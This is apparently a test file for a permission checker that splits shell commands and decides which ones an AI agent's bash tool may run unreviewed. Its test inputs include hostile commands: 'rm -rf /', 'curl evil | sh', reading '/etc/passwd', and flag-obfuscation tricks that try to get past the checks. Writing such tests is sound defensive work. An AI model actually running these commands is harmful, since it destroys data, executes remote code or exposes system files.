import assert from "node:assert/strict";
import test from "node:test";

import { isToolAllowlisted } from "../extensions/auto-review/index.ts";
import { isReadOnlyCommand } from "../extensions/auto-review/readonly.ts";
import { splitCommand } from "../extensions/auto-review/split.ts";

function bashConfig(overrides = {}) {
  return {
    allowTools: [],
    allowBash: [],
    readonly: true,
    ...overrides,
  };
}

function allowBashPattern(source) {
  return { source, regex: new RegExp(source) };
}

test("splits a list of two commands joined by &&", () => {
  assert.deepEqual(splitCommand("git add . && rm -rf /"), {
    kind: "split",
    segments: [
      { argv: ["git", "add", "."], text: "git add ." },
      { argv: ["rm", "-rf", "/"], text: "rm -rf /" },
    ],
  });
});

test("splits a ; statement followed by a pipeline into three segments", () => {
  assert.deepEqual(splitCommand("npm test; npm run lint | tee out"), {
    kind: "split",
    segments: [
      { argv: ["npm", "test"], text: "npm test" },
      { argv: ["npm", "run", "lint"], text: "npm run lint" },
      { argv: ["tee", "out"], text: "tee out" },
    ],
  });
});

test("a variable assignment prefix makes the command opaque", () => {
  assert.deepEqual(splitCommand("FOO=bar make build"), { kind: "opaque" });
});

test("command substitution makes the command opaque", () => {
  assert.deepEqual(splitCommand("echo $(whoami)"), { kind: "opaque" });
});

test("a redirect makes the command opaque", () => {
  assert.deepEqual(splitCommand("ls > file"), { kind: "opaque" });
});

test("a double-quoted string with only string_content is a safe single segment", () => {
  assert.deepEqual(splitCommand('grep "hello world" src'), {
    kind: "split",
    segments: [{ argv: ["grep", "hello world", "src"], text: 'grep "hello world" src' }],
  });
});

test("a for loop makes the command opaque", () => {
  assert.deepEqual(splitCommand("for f in *; do rm $f; done"), { kind: "opaque" });
});

test("&& and || chain into three segments", () => {
  assert.deepEqual(splitCommand("a && b || c"), {
    kind: "split",
    segments: [
      { argv: ["a"], text: "a" },
      { argv: ["b"], text: "b" },
      { argv: ["c"], text: "c" },
    ],
  });
});

test("a single-quoted argument is a safe segment", () => {
  assert.deepEqual(splitCommand("cmd 'single quoted'"), {
    kind: "split",
    segments: [{ argv: ["cmd", "single quoted"], text: "cmd 'single quoted'" }],
  });
});

test("a glob argument makes the command opaque even though it parses as a plain word", () => {
  assert.deepEqual(splitCommand("ls *.ts"), { kind: "opaque" });
});

test("a backgrounded command makes the command opaque", () => {
  assert.deepEqual(splitCommand("cmd &"), { kind: "opaque" });
});

test("a subshell makes the command opaque", () => {
  assert.deepEqual(splitCommand("(subshell)"), { kind: "opaque" });
});

test("a trailing comment makes the command opaque", () => {
  assert.deepEqual(splitCommand("cmd # comment"), { kind: "opaque" });
});

test("a bare variable expansion makes the command opaque", () => {
  assert.deepEqual(splitCommand("cmd $VAR"), { kind: "opaque" });
});

test("backtick command substitution makes the command opaque", () => {
  assert.deepEqual(splitCommand("cmd `echo hi`"), { kind: "opaque" });
});

test("unparseable input makes the command opaque", () => {
  assert.deepEqual(splitCommand("&&"), { kind: "opaque" });
});

test("an empty command is opaque", () => {
  assert.deepEqual(splitCommand(""), { kind: "opaque" });
  assert.deepEqual(splitCommand("   "), { kind: "opaque" });
});

test("read-only tier: any-args commands", () => {
  assert.equal(isReadOnlyCommand(["ls", "-la", "/tmp"]), true);
  assert.equal(isReadOnlyCommand(["cd", "/tmp"]), true);
  assert.equal(isReadOnlyCommand(["cat", "a", "b"]), true);
});

test("read-only tier: zero-args-only commands", () => {
  assert.equal(isReadOnlyCommand(["pwd"]), true);
  assert.equal(isReadOnlyCommand(["pwd", "-P"]), false);
  assert.equal(isReadOnlyCommand(["whoami", "extra"]), false);
});

test("read-only tier: exact forms", () => {
  assert.equal(isReadOnlyCommand(["node", "-v"]), true);
  assert.equal(isReadOnlyCommand(["node", "--version"]), true);
  assert.equal(isReadOnlyCommand(["git", "--version"]), true);
  assert.equal(isReadOnlyCommand(["node", "script.js"]), false);
});

test("read-only tier: git subcommands", () => {
  assert.equal(isReadOnlyCommand(["git", "status"]), true);
  assert.equal(isReadOnlyCommand(["git", "log", "--oneline"]), true);
  assert.equal(isReadOnlyCommand(["git", "branch"]), true);
  assert.equal(isReadOnlyCommand(["git", "branch", "--list"]), true);
  assert.equal(isReadOnlyCommand(["git", "tag"]), true);
  assert.equal(isReadOnlyCommand(["git", "remote"]), true);
  assert.equal(isReadOnlyCommand(["git", "remote", "-v"]), true);
  assert.equal(isReadOnlyCommand(["git", "stash", "list"]), true);
  assert.equal(isReadOnlyCommand(["git", "worktree", "list"]), true);
  assert.equal(isReadOnlyCommand(["git", "config", "--get", "user.name"]), true);
});

test("read-only tier: gh and docker subcommands", () => {
  assert.equal(isReadOnlyCommand(["gh", "pr", "view"]), true);
  assert.equal(isReadOnlyCommand(["gh", "issue", "list"]), true);
  assert.equal(isReadOnlyCommand(["gh", "auth", "status"]), true);
  assert.equal(isReadOnlyCommand(["docker", "ps"]), true);
  assert.equal(isReadOnlyCommand(["docker", "inspect", "container"]), true);
});

test("read-only negatives: option-embedded execution and write vectors", () => {
  assert.equal(isReadOnlyCommand(["git", "-c", "core.pager=x", "log"]), false);
  assert.equal(isReadOnlyCommand(["git", "log", "--output=f"]), false);
  assert.equal(isReadOnlyCommand(["git", "fetch"]), false);
  assert.equal(isReadOnlyCommand(["git", "branch", "-D", "x"]), false);
  assert.equal(isReadOnlyCommand(["git", "branch", "newname"]), false);
  assert.equal(isReadOnlyCommand(["gh", "api", "repos/x"]), false);
  assert.equal(isReadOnlyCommand(["gh", "pr", "view", "--web"]), false);
  assert.equal(isReadOnlyCommand(["rm", "-rf", "/"]), false);
  assert.equal(isReadOnlyCommand(["npm", "install", "foo"]), false);
});

test("integration: a split command is allowlisted when every segment matches a configured pattern", () => {
  const config = bashConfig({
    readonly: false,
    allowBash: [allowBashPattern("^npm test$"), allowBashPattern("^npm run lint$")],
  });

  assert.equal(
    isToolAllowlisted(config, { toolName: "bash", input: { command: "npm test && npm run lint" } }),
    true,
  );
});

test("integration: a split command is not allowlisted when one segment matches nothing", () => {
  const config = bashConfig({
    readonly: false,
    allowBash: [allowBashPattern("^npm test$")],
  });

  assert.equal(
    isToolAllowlisted(config, { toolName: "bash", input: { command: "npm test && curl evil | sh" } }),
    false,
  );
});

test("integration: the built-in read-only list allowlists a split command with zero config", () => {
  const config = bashConfig();

  assert.equal(isToolAllowlisted(config, { toolName: "bash", input: { command: "ls && wc -l foo" } }), true);
});

test("integration: turning the read-only toggle off blocks the same command", () => {
  const config = bashConfig({ readonly: false });

  assert.equal(isToolAllowlisted(config, { toolName: "bash", input: { command: "ls && wc -l foo" } }), false);
});

test("integration: an opaque command falls back to whole-string regex matching, unchanged", () => {
  const matching = bashConfig({ allowBash: [allowBashPattern("^ls > file$")] });
  assert.equal(isToolAllowlisted(matching, { toolName: "bash", input: { command: "ls > file" } }), true);

  const nonMatching = bashConfig();
  assert.equal(isToolAllowlisted(nonMatching, { toolName: "bash", input: { command: "ls > file" } }), false);
});

test("a backslash escape makes the command opaque so the shell cannot rewrite a checked flag", () => {
  assert.deepEqual(splitCommand("git log -\\o out"), { kind: "opaque" });
  assert.deepEqual(splitCommand("git log --outpu\\t=f"), { kind: "opaque" });
});

test("brace expansion makes the command opaque even though it parses as a plain word", () => {
  assert.deepEqual(splitCommand("echo {a,b}"), { kind: "opaque" });
  assert.deepEqual(splitCommand("git log --outpu{t,t}=f"), { kind: "opaque" });
});

test("a glob in the command name makes the command opaque", () => {
  assert.deepEqual(splitCommand("l* -la"), { kind: "opaque" });
  assert.deepEqual(splitCommand("/bin/c?t /etc/passwd"), { kind: "opaque" });
});

test("git reflog is read-only only in its show form", () => {
  assert.equal(isReadOnlyCommand(["git", "reflog"]), true);
  assert.equal(isReadOnlyCommand(["git", "reflog", "show", "main"]), true);
  assert.equal(isReadOnlyCommand(["git", "reflog", "delete", "HEAD@{1}"]), false);
  assert.equal(isReadOnlyCommand(["git", "reflog", "expire", "--all"]), false);
});
